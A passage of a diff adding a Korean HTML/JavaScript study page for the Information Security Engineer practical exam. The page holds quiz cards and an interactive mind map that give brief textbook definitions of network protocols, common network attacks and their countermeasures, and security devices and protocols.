@@ -1,0 +1,902 @@
+<!doctype html><html><head><meta charset=utf8><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><style>:root{color-scheme:light;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}html{scroll-padding-top:env(safe-area-inset-top,0px)}body{margin:0;padding:0;font:14px -apple-system,BlinkMacSystemFont,sans-serif;background:#fff;color:#000}img{max-width:100%}[hidden]:not([hidden=until-found i]){display:none!important}</style></head><body>
+<title>실기 개념 지도</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans+KR:wght@500;700&family=Noto+Sans+KR:wght@400;500;700&display=swap">
+<style>
+/* Layout: 가운데 주제 → 갈래 → 묶음 → 개념으로 펼쳐지는 트리형 마인드맵. +N을 누르면 하위가 펼쳐지고, 개념을 누르면 설명 패널이 뜬다 */
+:root{
+  --bg:#f2ebdf;
+  --band:#e9dfcf;
+  --node:#faf6ee;
+  --fg:#3a3027;
+  --muted:#7b6c5b;
+  --line:#c9b9a2;
+  --accent:#86664a;
+  --miss:#e0cfb3;
+  --font-display:"IBM Plex Sans KR","Noto Sans KR",system-ui,sans-serif;
+  --font-body:"Noto Sans KR",system-ui,-apple-system,"Apple SD Gothic Neo",sans-serif;
+}
+@media (prefers-color-scheme: dark){
+  :root:not([data-theme="light"]){
+    --bg:#211c17;--band:#2a241e;--node:#2f2822;--fg:#e9e0d2;--muted:#a8977f;--line:#4d4238;--accent:#c7a57f;--miss:#4a3d30;color-scheme:dark;
+  }
+}
+:root[data-theme="dark"]{
+  --bg:#211c17;--band:#2a241e;--node:#2f2822;--fg:#e9e0d2;--muted:#a8977f;--line:#4d4238;--accent:#c7a57f;--miss:#4a3d30;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{
+  background:var(--bg);color:var(--fg);font-family:var(--font-body);font-size:15px;line-height:1.7;
+  padding-left:max(16px,env(safe-area-inset-left,0px));padding-right:max(16px,env(safe-area-inset-right,0px));
+  padding-block:28px 48px;
+}
+.wrap{max-width:1400px;margin:0 auto;display:flex;flex-direction:column;gap:18px}
+header{display:flex;flex-direction:column;gap:4px}
+.eyebrow{font-size:12px;letter-spacing:.08em;color:var(--muted)}
+h1{font-family:var(--font-display);font-weight:700;font-size:clamp(24px,3.6vw,32px);line-height:1.2;margin:0}
+.lede{margin:0;color:var(--muted);font-size:14px}
+.tools{display:flex;flex-wrap:wrap;gap:8px;align-items:center}
+.tools button{
+  font:inherit;font-size:13px;color:var(--fg);background:transparent;border:1px solid var(--line);
+  border-radius:999px;padding:4px 13px;cursor:pointer;line-height:1.6;
+}
+.tools button[aria-pressed="true"]{background:var(--fg);color:var(--bg);border-color:var(--fg)}
+.tools .sp{flex:1}
+button:focus-visible,.node:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
+
+.mapbox{background:var(--band);border-radius:12px;overflow:auto;-webkit-overflow-scrolling:touch;max-height:calc(100vh - 170px);min-height:340px}
+#map{display:block}
+#map text{font-family:var(--font-body);fill:var(--fg);pointer-events:none}
+#map text .badge{fill:var(--muted);font-weight:500}
+.edge{fill:none;stroke:var(--line);stroke-width:1.4;transition:opacity .2s}
+.xlink{fill:none;stroke:var(--accent);stroke-width:1.4;stroke-dasharray:4 4}
+.node{cursor:pointer;transition:opacity .2s}
+.node rect{fill:var(--node);stroke:var(--line);stroke-width:1}
+.node:hover rect{stroke:var(--accent)}
+.node.hub rect{fill:var(--bg);stroke:var(--fg);stroke-width:1.3}
+.node.hub text{font-family:var(--font-display);font-weight:700}
+.node.group rect{fill:var(--bg);stroke:var(--muted)}
+.node.center rect{fill:var(--fg);stroke:var(--fg)}
+#map .node.center text{fill:var(--bg);font-family:var(--font-display);font-weight:700}
+body.show-miss .node.miss rect{fill:var(--miss);stroke:var(--accent)}
+#map.focus .node:not(.on),#map.focus .edge:not(.on){opacity:.22}
+.node.sel rect{stroke:var(--accent);stroke-width:2.4}
+.node.rel rect{stroke:var(--accent);stroke-width:1.6}
+
+.panel{
+  position:fixed;z-index:5;right:max(20px,env(safe-area-inset-right,0px));bottom:max(20px,env(safe-area-inset-bottom,0px));
+  width:min(380px,calc(100vw - 32px));max-height:min(60vh,520px);overflow:auto;
+  background:var(--node);color:var(--fg);border:1px solid var(--line);border-radius:12px;
+  box-shadow:0 10px 30px rgba(40,30,20,.16);padding:16px 18px 18px;
+}
+.panel .top{display:flex;align-items:flex-start;gap:10px}
+.panel .where{font-size:12px;color:var(--muted);letter-spacing:.02em}
+.panel h2{font-family:var(--font-display);font-size:19px;margin:2px 0 0;line-height:1.35}
+.panel .x{margin-left:auto;font:inherit;font-size:20px;line-height:1;background:transparent;border:0;color:var(--muted);cursor:pointer;padding:2px 4px}
+.panel ul{margin:12px 0 0;padding-left:18px;display:flex;flex-direction:column;gap:6px;font-size:14px}
+.panel .rel-title{margin:14px 0 6px;font-size:12px;color:var(--muted)}
+.panel .chips{display:flex;flex-wrap:wrap;gap:6px}
+.panel .chips button{font:inherit;font-size:13px;background:transparent;color:var(--accent);border:1px solid var(--line);border-radius:999px;padding:2px 11px;cursor:pointer}
+.panel .chips button:hover{border-color:var(--accent)}
+@media (max-width:640px){
+  .panel{left:max(16px,env(safe-area-inset-left,0px));right:max(16px,env(safe-area-inset-right,0px));width:auto;bottom:max(12px,env(safe-area-inset-bottom,0px));max-height:48vh}
+}
+footer{font-size:12.5px;color:var(--muted)}
+.tabs{display:flex;gap:4px;border-bottom:1px solid var(--line)}
+.tabs button{font:inherit;font-size:15px;font-weight:700;font-family:var(--font-display);color:var(--muted);background:transparent;border:0;border-bottom:2px solid transparent;padding:8px 14px;margin-bottom:-1px;cursor:pointer}
+.tabs button[aria-selected="true"]{color:var(--fg);border-bottom-color:var(--fg)}
+.view{display:flex;flex-direction:column;gap:18px}
+.view[hidden]{display:none!important}
+.qbar{display:flex;flex-wrap:wrap;gap:8px;align-items:center}
+.qbar select{font:inherit;font-size:13px;color:var(--fg);background:var(--node);border:1px solid var(--line);border-radius:999px;padding:4px 10px;max-width:100%}
+.qbar button{font:inherit;font-size:13px;color:var(--fg);background:transparent;border:1px solid var(--line);border-radius:999px;padding:4px 13px;cursor:pointer;line-height:1.6}
+.qbar button[aria-pressed="true"]{background:var(--fg);color:var(--bg);border-color:var(--fg)}
+.qstat{font-size:13px;color:var(--muted);margin-left:auto}
+.cards{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:12px}
+.card{background:var(--node);border:1px solid var(--line);border-radius:12px;padding:14px 16px;display:flex;flex-direction:column;gap:8px}
+.card.miss{border-color:var(--accent);box-shadow:inset 3px 0 0 var(--accent)}
+.card .path{font-size:12px;color:var(--muted)}
+.card .clue{font-size:15px;line-height:1.65}
+.card .ans{border-top:1px dashed var(--line);padding-top:8px}
+.card .ans b{font-family:var(--font-display);font-size:16px;display:block}
+.card .ans ul{margin:6px 0 0;padding-left:18px;font-size:13.5px;color:var(--fg);display:flex;flex-direction:column;gap:3px}
+.card .act{display:flex;gap:6px;flex-wrap:wrap}
+.card .act button{font:inherit;font-size:13px;background:transparent;color:var(--fg);border:1px solid var(--line);border-radius:999px;padding:3px 12px;cursor:pointer}
+.card .act button.reveal{border-color:var(--fg)}
+.card .act button.on{background:var(--fg);color:var(--bg);border-color:var(--fg)}
+.empty{color:var(--muted);font-size:14px;padding:24px 0}
+</style>
+
+<div class="wrap">
+  <header>
+    <span class="eyebrow">정보보안기사 실기 · 과목 → 교재 장 → 개념 · 풀면서 채우는 지도</span>
+    <h1>실기 개념 지도</h1>
+    <p class="lede">가리기: 기출 단서만 보고 답을 떠올린 뒤 확인한다. 지도: +숫자를 누르면 하위 개념이 펼쳐진다.</p>
+  </header>
+  <div class="tabs" role="tablist">
+    <button type="button" role="tab" id="tab-quiz" aria-selected="true" aria-controls="view-quiz">가리기</button>
+    <button type="button" role="tab" id="tab-map" aria-selected="false" aria-controls="view-map">지도</button>
+  </div>
+  <section class="view" id="view-quiz" role="tabpanel" aria-labelledby="tab-quiz">
+    <div class="qbar">
+      <select id="q-ch" aria-label="장 선택"></select>
+      <button type="button" id="q-missonly" aria-pressed="false">틀린 것만</button>
+      <button type="button" id="q-shuffle">섞기</button>
+      <button type="button" id="q-hideall">답 모두 가리기</button>
+      <span class="qstat" id="q-stat"></span>
+    </div>
+    <div class="cards" id="q-cards"></div>
+  </section>
+  <section class="view" id="view-map" role="tabpanel" aria-labelledby="tab-map" hidden>
+  <div class="tools">
+    <button type="button" id="open-all">모두 펼치기</button>
+    <button type="button" id="close-all">모두 접기</button>
+    <button type="button" id="toggle-miss" aria-pressed="false">헷갈린 개념 표시</button>
+    <span class="sp"></span>
+    <button type="button" id="zoom-out" aria-label="축소">−</button>
+    <button type="button" id="zoom-fit">전체 보기</button>
+    <button type="button" id="zoom-in" aria-label="확대">+</button>
+  </div>
+  <div class="mapbox" id="mapbox">
+    <svg id="map" xmlns="http://www.w3.org/2000/svg" role="group" aria-label="개념 지도"></svg>
+  </div>
+  </section>
+  <footer>기출을 풀며 나온 개념을 교재 장 순서로 모았다. 빈 장은 풀면서 채운다.</footer>
+</div>
+
+<div class="panel" id="panel" hidden>
+  <div class="top">
+    <div>
+      <div class="where" id="p-where"></div>
+      <h2 id="p-title"></h2>
+    </div>
+    <button type="button" class="x" id="p-close" aria-label="닫기">×</button>
+  </div>
+  <ul id="p-desc"></ul>
+  <div id="p-relwrap">
+    <div class="rel-title">연결된 개념</div>
+    <div class="chips" id="p-rel"></div>
+  </div>
+</div>
+
+<script>
+(function(){
+/* n(id, 이름, 설명[], 하위[], 헷갈림) */
+function n(id,label,d,k,m){return {id:id,label:label,d:d,k:k||[],m:m?1:0};}
+
+var TREE=n("center","정보보안기사 실기",["과목 → 교재 장 → 개념 순서로 펼쳐진다.","풀면서 나온 개념을 계속 채운다."],[
+ n("s1","1과목 운영체제 보안",["아직 지도에 정리하지 않은 과목. 오늘 저녁에 채운다."],[
+  n("s1c1","1장 정보시스템",["윈도우·유닉스 구조, 로그, 계정, 권한."]),
+  n("s1c2","2장 취약점 점검",["계정·파일·서비스 설정 점검."])
+ ]),
+ n("s2","2과목 네트워크 보안",["TCP/IP 정상 동작 → 공격 → 보안 기술 → 장비 설정 점검."],[
+  n("s2c1","1장 네트워크 일반",["모든 공격은 이 정상 동작을 속이거나 과부하를 일으킨다."],[
+   n("base","TCP/IP 기초",["모든 공격은 이 정상 동작을 속이거나 과부하를 일으킨다.","정상 동작을 알면 공격이 이해된다."],[
+    n("layer","계층과 데이터 단위",["보낼 때 계층을 내려가며 헤더를 한 겹씩 씌운다(캡슐화). 받을 때는 바깥부터 벗긴다.","[MAC 헤더 [IP 헤더 [TCP 헤더 [데이터]]]]"],[
+     n("l1","1계층 물리 · 비트",["0과 1을 전기·빛·전파 신호로 바꿔 보낸다."]),
+     n("l2","2계층 데이터링크 · 프레임",["MAC 주소가 붙는다.","스위치는 이 계층(MAC 주소)까지만 본다."]),
+     n("l3","3계층 네트워크 · 패킷",["IP 주소가 붙는다.","라우터는 이 계층(IP 주소)까지 본다."]),
+     n("l4","4계층 전송 · 세그먼트/데이터그램",["포트 번호, SEQ·ACK 번호가 붙는다.","TCP 단위는 세그먼트, UDP 단위는 데이터그램."]),
+     n("frag","프래그먼트 (IP 단편화)",["패킷이 MTU(이더넷은 보통 1500바이트)보다 크면 3계층에서 여러 조각으로 나눈다.","받는 쪽은 Fragment Offset을 보고 조각을 다시 합친다.","계층의 데이터 단위가 아니라, 패킷을 나눈 조각이다."],[],1)
+    ],1),
+    n("tcpudp","TCP와 UDP",["4계층(전송 계층)의 두 전송 방식."],[
+     n("tcp","TCP",["연결을 먼저 맺고, 순서를 맞추고, 빠진 데이터는 다시 보낸다.","예: 웹, 이메일."]),
+     n("udp","UDP",["연결 없이 데이터그램을 하나씩 보낸다.","순서 보장·재전송·발신자 확인이 없어서 출발지 위조가 쉽다. 그래서 반사 공격에 쓰인다.","예: DNS, SNMP, NTP, 영상 통화."],[],1)
+    ],1),
+    n("tcpconn","TCP 연결",["TCP가 연결을 맺고 번호를 맞추는 방법."],[
+     n("3way","3-Way Handshake",["SYN → SYN+ACK → ACK.","서버의 SYN+ACK는 \"네 번호 받았음(ACK)\"과 \"내 시작 번호(SYN)\"를 한 번에 보낸 것이다.","열린 포트는 SYN+ACK, 닫힌 포트는 RST+ACK로 응답한다."],[],1),
+     n("seq","SEQ · ACK 번호",["SEQ: 보내는 쪽 자신의 번호.","ACK: 상대가 보낸 번호 + 1 (다음에 받을 번호).","예: 클라이언트 SEQ 4551 → 서버 SEQ 7311·ACK 4552 → 클라이언트 SEQ 4552·ACK 7312.","표를 볼 때는 보내는 쪽부터 확인한다."],[],1),
+     n("flags","TCP 플래그",["SYN 연결 요청, ACK 수신 확인, FIN 정상 종료, RST 강제 종료, PSH 즉시 전달, URG 긴급."])
+    ]),
+    n("addr","주소 찾기",["IP 주소와 MAC 주소를 서로 알아내는 프로토콜."],[
+     n("arp","ARP",["IP 주소로 MAC 주소를 알아낸다."],[
+      n("arpreq","ARP Request",["목적지 MAC을 FF:FF:FF:FF:FF:FF(브로드캐스트)로 보내 네트워크 전체에 묻는다.","상대 MAC을 모르고, 2계층은 목적지 MAC 없이 프레임을 보낼 수 없기 때문이다."],[],1),
+      n("arprep","ARP Reply",["찾는 IP를 가진 장비만 자기 MAC 주소로 답한다."]),
+      n("arpcache","ARP 캐시 테이블",["알아낸 IP–MAC 쌍을 저장하는 표.","ARP 스푸핑이 이 표를 바꾼다."])
+     ],1),
+     n("rarp","RARP",["ARP의 반대. MAC 주소로 IP 주소를 알아낸다.","하드디스크가 없는 장비나 네트워크로 부팅하는 장비가 사용한다."],[],1)
+    ]),
+    n("icmpg","ICMP",["네트워크 상태를 확인하고 오류를 알리는 3계층 프로토콜."],[
+     n("echo","Echo Request · Reply",["ping이 쓰는 메시지.","Echo Request로 묻고 Echo Reply로 답한다."]),
+     n("dbcast","Directed Broadcast",["외부 네트워크에서 특정 네트워크 전체로 보내는 브로드캐스트.","철자 주의: Directed."],[],1)
+    ]),
+    n("httpg","HTTP 규칙",["웹 공격이 악용하는 HTTP의 기본 규칙."],[
+     n("crlf","CRLF",["줄바꿈 문자. CR(0D)은 줄 맨 앞으로, LF(0A)는 다음 줄로.","두 번 연속(0D0A0D0A)이면 HTTP 헤더가 끝난다."],[],1),
+     n("clte","본문 끝 판단",["요청 본문이 어디서 끝나는지 알리는 두 방식."],[
+      n("cl","Content-Length",["본문 전체 길이를 미리 알린다."]),
+      n("chunked","Transfer-Encoding: chunked",["조각마다 크기를 적고, 크기 0인 조각으로 끝을 알린다."])
+     ],1),
+     n("cookie","쿠키 자동 전송",["브라우저는 요청의 목적지 도메인에 맞는 쿠키를 자동으로 붙인다. 요청을 만든 페이지가 어디인지는 보지 않는다.","SameSite 속성: Strict는 다른 사이트 요청에 붙이지 않음, Lax는 링크 이동에만 붙임, None은 항상 붙임."],[],1)
+    ])
+   ]),
+   n("lan","LAN · 장비 관리",["같은 네트워크 안의 장비가 프레임을 주고받고, 관리자가 장비를 감시하는 방법."],[
+    n("swmode","스위치 전송 방식",["스위치가 프레임을 어느 시점에 내보내는지로 나뉜다.","빠를수록 오류 검사가 적다."],[
+     n("cut","Cut Through",["목적지 MAC 주소만 읽고 바로 내보낸다.","가장 빠르지만, 오류가 있는 프레임도 그대로 보낸다."]),
+     n("ffree","Fragment Free",["프레임의 앞 64바이트까지 받고 내보낸다.","충돌로 깨진 짧은 프레임(64바이트 미만)을 걸러 낸다. 속도와 정확성이 중간."]),
+     n("snf","Store and Forward",["프레임 전체를 받아 오류(CRC)를 검사한 뒤 내보낸다.","가장 느리지만 가장 정확하다."])
+    ],1),
+    n("swfunc","스위치 기능 5가지",["스위치: 같은 네트워크 안에서 MAC 주소를 보고 목적지 포트로만 프레임을 보내는 2계층 장비.","허브는 모든 포트로 복사해 보낸다."],[
+     n("learning","Learning",["들어온 포트와 출발지 MAC을 MAC 주소 테이블에 저장한다."]),
+     n("flooding","Flooding",["목적지 MAC이 테이블에 없으면, 들어온 포트를 뺀 모든 포트로 보낸다."]),
+     n("forwarding","Forwarding",["목적지 MAC이 테이블에 있으면 그 포트로만 보낸다."]),
+     n("filtering","Filtering",["목적지가 들어온 포트와 같은 쪽이면 다른 포트로 보내지 않는다."]),
+     n("aging","Aging",["일정 시간 쓰이지 않은 테이블 항목을 지운다."])
+    ],1),
+    n("vlan","VLAN",["스위치 하나를 논리적으로 여러 네트워크로 나누는 기술."],[
+     n("vlanwhy","VLAN 목적",["보안: 네트워크 자원 접근을 제한한다.","크기: 브로드캐스트 도메인의 크기를 줄인다.","성능: 브로드캐스트 트래픽이 줄어 전체 성능이 좋아진다.","흐름: 나누면 접근이 막히고(보안), 브로드캐스트 범위가 작아지고(크기), 그래서 빨라진다(성능)."],[],1),
+     n("vlantype","VLAN 구성 방식",["무엇을 기준으로 VLAN을 정하는지로 나뉜다."],[
+      n("vport","포트 기반",["스위치 포트별로 VLAN을 할당한다. 정적 VLAN, 가장 일반적."]),
+      n("vmac","MAC 기반",["호스트 MAC 주소로 VLAN을 정한다. 동적 VLAN. 모든 MAC을 등록·관리하기 어렵다."]),
+      n("vip","IP 기반",["네트워크 주소(IP)별로 VLAN을 구성한다."]),
+      n("vproto","프로토콜 기반",["같은 통신 프로토콜끼리 통신하도록 구성한다."])
+     ],1)
+    ]),
+    n("routing","라우팅 프로토콜",["라우터(3계층)끼리 목적지까지 가는 길 정보를 주고받는 규칙.","AS 안에서 쓰는지, AS 사이에서 쓰는지로 나뉜다."],[
+     n("as","AS (자율 시스템)",["Autonomous System. 한 기관이 직접 관리하는 네트워크 덩어리.","예: KT 네트워크, 큰 대학·회사 네트워크. 고유 AS 번호를 받는다.","인터넷은 수많은 AS가 연결된 것이다."]),
+     n("igp","내부 (IGP)",["Interior Gateway Protocol. AS 안에서 길을 찾는다."],[
+      n("rip","RIP",["거리 벡터 방식. 메트릭은 홉 수.","최대 15홉까지만 간다(16홉은 도달 불가).","작은 네트워크용."],[],1),
+      n("ospf","OSPF",["링크 상태 방식. 다익스트라 알고리즘으로 최단 경로를 계산한다.","RIP의 단점을 개선해 크고 복잡한 네트워크에 쓴다."],[],1),
+      n("eigrp","EIGRP",["시스코의 IGRP를 개선한 프로토콜.","메트릭: 대역폭, 지연, 신뢰도, 부하, MTU, 홉 수."],[],1)
+     ],1),
+     n("egp","외부 (EGP)",["Exterior Gateway Protocol. AS와 AS 사이에서 길을 찾는다."],[
+      n("bgp","BGP",["Border Gateway Protocol.","예: KT와 SK 네트워크가 서로 길 정보를 주고받을 때 쓴다."])
+     ])
+    ],1),
+    n("promisc","Promiscuous Mode",["네트워크 카드가 자기에게 오지 않은 프레임까지 받는 모드.","스니핑에 쓰이고, NIDS도 이 모드로 패킷을 수집한다."]),
+    n("snmp","SNMP",["네트워크 장비의 상태를 감시하고 설정을 관리하는 프로토콜."],[
+     n("snmpcomp","구성 요소",["Manager: 장비를 감시하는 관리 서버.","Agent: 장비 안에서 정보를 제공하는 프로그램.","MIB: 장비 정보를 담은 데이터베이스."]),
+     n("polling","폴링 · UDP 161",["Manager가 Agent에게 정보를 요청한다.","Agent가 UDP 161번으로 받는다."],[],1),
+     n("trap","이벤트 리포팅 · UDP 162",["Agent가 Trap으로 먼저 알린다.","Manager가 UDP 162번으로 받는다."],[],1),
+     n("snmpver","버전",["v1·v2c: 커뮤니티 스트링을 평문으로 보낸다.","v3: 인증과 암호화를 지원한다."]),
+     n("snmpv3","SNMPv3 보안 매개변수",["msgSecurityParameters. 이름만 보고 막는 공격을 찾는다. (6회 기출)"],[
+      n("v3time","EngineID · Boots · Time",["메시지가 언제 만들어졌는지 확인해 오래된 메시지를 버린다.","막는 공격: 재전송 공격."],[],1),
+      n("v3auth","UserName · AuthenticationParameters",["보낸 사람을 인증하고 무결성 확인값을 붙인다.","막는 공격: 메시지 위변조 공격."],[],1),
+      n("v3priv","PrivacyParameters",["내용을 암호화한다.","막는 공격: 도청(스니핑) 공격."],[],1)
+     ],1)
+    ],1),
+    n("syslog","Syslog",["장비의 상황과 변화를 기록하는 프로토콜.","이벤트가 생기면 자기 로그 파일에 저장하면서 Syslog 서버로도 보낸다."])
+   ])
+  ]),
+  n("s2c2","2장 네트워크 기반 공격",["정찰 → 엿보기·위장 → 서비스 거부 → HTTP 규칙 악용 순서."],[
+   n("scan","포트 스캔",["공격 전에 열린 포트를 확인하는 정찰.","3-Way Handshake를 어디까지 진행하는지로 구분한다."],[
+    n("open","TCP Open Scan",["연결을 끝까지 맺는다(SYN → SYN+ACK → ACK).","로그가 남는다."]),
+    n("half","Half-Open Scan",["SYN+ACK를 받으면 RST로 바로 끊는다.","연결이 완성되지 않아 로그가 남지 않는다.","닫힌 포트는 RST+ACK로 응답한다. 응답이 없으면 방화벽 필터링 가능성이 있다."],[],1),
+    n("stealth","스텔스 스캔",["닫힌 포트는 RST로 응답하고, 열린 포트는 응답하지 않는다."],[
+     n("fin","FIN Scan",["FIN 플래그만 켠다."]),
+     n("null","NULL Scan",["플래그를 모두 끈다."]),
+     n("xmas","Xmas Scan",["FIN·URG·PSH를 켠다."])
+    ],1)
+   ]),
+   n("sniff","스니핑 · 스푸핑 · 탈취",["남의 데이터를 엿보거나 남으로 위장하는 공격.","TCP/IP가 주소와 순서 번호만 확인하고 암호화하지 않아서 생긴다."],[
+    n("jamming","Switch Jamming",["가짜 MAC 주소를 대량으로 보내 스위치의 MAC 주소 테이블을 가득 채운다.","스위치가 더미 허브처럼 모든 포트로 전달하게 된다.","다른 이름: MAC Flooding."],[],1),
+    n("arpspoof","ARP 스푸핑",["위조한 ARP Reply를 계속 보내, 피해자의 ARP 캐시 테이블에서 특정 호스트의 MAC 주소를 공격자의 MAC 주소로 바꾼다.","대응: 정적 ARP 설정 arp -s [IP] [MAC].","철자: ARP (APR 아님)."],[],1),
+    n("hijack","세션 하이재킹",["시퀀스 번호를 알아낸 뒤 RST로 기존 연결을 끊고, 새 번호로 연결을 가로챈다.","인증 절차 없이 세션을 차지한다."],[],1)
+   ]),
+   n("dos","서비스 거부",["서비스를 못 쓰게 만드는 공격(가용성 침해)."],[
+    n("exhaust","자원 고갈",["서버의 연결 대기열 같은 자원을 가득 채운다."],[
+     n("synflood","SYN Flooding",["SYN만 계속 보내고 ACK는 보내지 않아 서버의 연결 대기열을 가득 채운다.","답안에 SYN을 꼭 쓴다."],[],1)
+    ]),
+    n("malformed","비정상 패킷",["정상적으로 처리할 수 없는 패킷으로 오류를 일으킨다."],[
+     n("land","Land Attack",["출발지 IP와 목적지 IP를 같게 만들어, 대상이 자기 자신에게 응답하게 한다."]),
+     n("teardrop","Teardrop",["조각난 패킷의 Fragment Offset을 겹치게 조작해, 재조립 과정에서 오류를 일으킨다."])
+    ]),
+    n("reflect","반사 · 증폭",["출발지 IP를 피해자로 위조해, 제3자의 응답이 피해자에게 몰리게 한다.","작은 요청에 큰 응답을 주는 서비스를 악용한다."],[
+     n("smurf","Smurf",["출발지를 피해자 IP로 위조한 ICMP Echo Request를 Directed Broadcast로 보낸다.","여러 호스트의 Echo Reply가 피해자에게 몰린다.","Land와 혼동하지 않는다."],[],1),
+     n("memcached","Memcached · UDP 11211",["최대 51,000배 증폭.","외부에서 오는 출발지 포트 11211 응답을 차단한다."],[],1),
+     n("ntp","NTP · UDP 123",["monlist 명령(최근 접속자 최대 600개 응답)을 악용한다.","대응: NTP 버전 업그레이드, disable monitor 설정."],[],1),
+     n("ssdp","SSDP · UDP 1900",["ssdp:all 검색 요청을 악용한다.","최대 30배 증폭."],[],1),
+     n("dnsamp","DNS · UDP 53",["큰 응답을 돌려주는 DNS 질의를 악용한다."])
+    ],1),
+    n("slow","Slow DoS",["정상처럼 느리게 통신해 연결을 오래 붙잡는다."],[
+     n("slowloris","Slowloris",["헤더 끝 표시(0D0A0D0A)를 보내지 않아 연결을 계속 붙잡는다.","다른 이름: Slow HTTP Header DoS."],[],1),
+     n("rudy","RUDY",["요청 본문(Body)을 아주 천천히 보낸다.","다른 이름: Slow HTTP POST."]),
+     n("slowread","Slow Read",["TCP 윈도우 크기를 작게 설정해 응답을 아주 천천히 받는다."],[],1)
+    ])
+   ]),
+   n("httpabuse","HTTP 규칙 악용",["HTTP가 헤더와 본문의 끝을 판단하는 방식을 속인다."],[
+    n("split","HTTP 응답 분할",["입력값에 CR(%0D)·LF(%0A)를 넣어 응답 헤더를 일찍 끝내고, 응답을 둘로 나눈다.","대응: 입력값에서 CR·LF를 제거한다."],[],1),
+    n("smuggle","Request Smuggling",["프론트엔드와 백엔드 서버가 요청의 끝을 다르게 판단하는 점을 악용한다.","처리되지 않고 남은 부분이 다음 사용자 요청 앞에 붙는다.","대응: 해석 기준 통일, 두 헤더가 함께 있는 요청 거부, HTTP/2 사용."],[
+     n("cl_te","CL.TE",["프론트엔드는 Content-Length, 백엔드는 chunked로 끝을 판단한다."]),
+     n("te_cl","TE.CL",["프론트엔드는 chunked, 백엔드는 Content-Length로 끝을 판단한다."]),
+     n("te_te","TE.TE",["둘 다 chunked를 지원하지만, 헤더를 변형해 한쪽이 chunked를 무시하게 만든다."])
+    ],1)
+   ]),
+   n("dga","DGA",["Domain Generation Algorithm. 2과목 18회 기출.","악성코드와 C&C 서버가 같은 알고리즘과 시드값으로 매일 도메인 수천 개를 만든다.","하나를 차단해도 다른 도메인으로 접속한다.","봇넷은 감염된 PC 무리를 뜻하므로 답이 아니다."],[],1)
+  ]),
+  n("s2c3","3장 네트워크 보안 기술",["공격을 막는 장비와 암호화 프로토콜."],[
+   n("ids","보안 장비",["이름이 비슷해 헷갈리기 쉽다.","핵심 동작(탐지·차단·관리·분석·대응·경보)으로 구별한다."],[
+    n("detect","탐지 · 차단",["공격을 찾아내거나 막는 장비."],[
+     n("idsmodel","IDS 탐지 방식",["IDS는 침입을 탐지만 하고 차단하지 않는다."],[
+      n("misuse","오용 탐지",["알려진 공격 패턴(시그니처)과 비교한다.","오탐이 적지만, 새로운 공격은 못 잡는다."]),
+      n("anomaly","이상 탐지",["평소와 다른 행동을 찾는다.","새로운 공격도 잡지만, 오탐이 많다."])
+     ],1),
+     n("fpfn","오탐 · 미탐",["탐지 결과가 틀리는 두 경우."],[
+      n("fp","오탐 (False Positive)",["정상을 공격으로 잘못 판단한다."]),
+      n("fn","미탐 (False Negative)",["공격을 정상으로 잘못 판단한다."])
+     ]),
+     n("hidsnids","설치 위치",["어디에 설치하는지로 나눈다."],[
+      n("hids","HIDS",["서버(호스트)에 설치한다.","로그와 파일 무결성으로 탐지한다."]),
+      n("nids","NIDS",["네트워크에 설치한다.","패킷으로 탐지하며, 암호화된 내용은 볼 수 없다."])
+     ],1),
+     n("ips","IPS",["탐지하고 차단까지 한다."]),
+     n("nac","NAC",["네트워크에 접속하기 전에 기기를 검사해, 허가되지 않았거나 감염된 기기를 차단한다.","예: PacketFence(오픈소스)."],[],1)
+    ]),
+    n("integ","통합 관리 · 분석",["여러 장비의 정보를 모아 관리하고 대응한다."],[
+     n("esm","ESM",["여러 보안 장비를 통합 관리한다.","구성요소: Agent, Manager, Console."]),
+     n("siem","SIEM",["모든 로그를 빅데이터로 연관 분석한다.","주요 기능: 수집, 분류, 변환, 분석."],[],1),
+     n("soar","SOAR",["탐지된 위협에 자동으로 대응한다.","Orchestration, Automation, Response. 대응 시나리오는 플레이북."],[],1),
+     n("tms","TMS",["외부 위협 정보를 모아 미리 경보한다.","Threat Management System."],[],1)
+    ])
+   ]),
+   n("proto","보안 프로토콜",["스니핑·스푸핑의 근본 대책인 암호화.","어느 계층을 보호하는지로 구분한다."],[
+    n("tls","SSL/TLS",["TCP 위에서 통신을 암호화한다. 기밀성·무결성·인증을 제공한다.","HTTPS의 S."],[
+     n("tlsup","상위 프로토콜",["Record 위에서 동작하는 세 프로토콜."],[
+      n("hs","Handshake",["서로 인증하고, 암호 알고리즘과 키를 협상한다."]),
+      n("ccs","Change Cipher Spec",["협상한 암호 방식으로 이제부터 바꾼다고 알린다."]),
+      n("alert","Alert",["문제가 생기면 경고·오류를 알린다."])
+     ]),
+     n("record","Record 프로토콜",["단편화 → 압축 → MAC 추가 → 암호화 → 헤더 추가.","외우는 법: 단·압·맥·암."],[],1),
+     n("rtt","RTT",["TLS 1.2는 2-RTT, TLS 1.3 첫 연결은 1-RTT, TLS 1.3 세션 재개는 0-RTT.","TCP 3-Way Handshake와는 다른 이야기다."],[],1),
+     n("dtls","DTLS",["UDP(데이터그램) 환경에서 쓰는 TLS."],[],1)
+    ]),
+    n("ipsec","IPSec",["3계층(네트워크 계층)을 보호한다."],[
+     n("ah","AH",["송신자 인증과 무결성만 제공하고, 암호화는 하지 않는다.","32비트 Sequence Number로 재전송 공격을 막는다."],[],1),
+     n("esp","ESP",["AH의 기능에 기밀성(암호화)을 더한다."],[],1),
+     n("mode","동작 모드",["무엇을 보호하는지로 나뉜다."],[
+      n("transport","전송 모드",["페이로드만 보호한다.","호스트와 호스트 사이에서 쓴다."]),
+      n("tunnel","터널 모드",["패킷 전체를 보호하고 새 IP 헤더를 붙인다.","게이트웨이 사이에서 쓴다."])
+     ]),
+     n("ike","IKE",["IPSec에서 쓸 키를 교환한다."])
+    ]),
+    n("vpn","VPN 터널링",["계층별로 쓰는 프로토콜이 다르다."],[
+     n("l2f","L2F",["2계층. Cisco가 만들었고 UDP를 사용한다."]),
+     n("pptp","PPTP",["2계층. Microsoft가 만들었고 PPP로 인증한다."]),
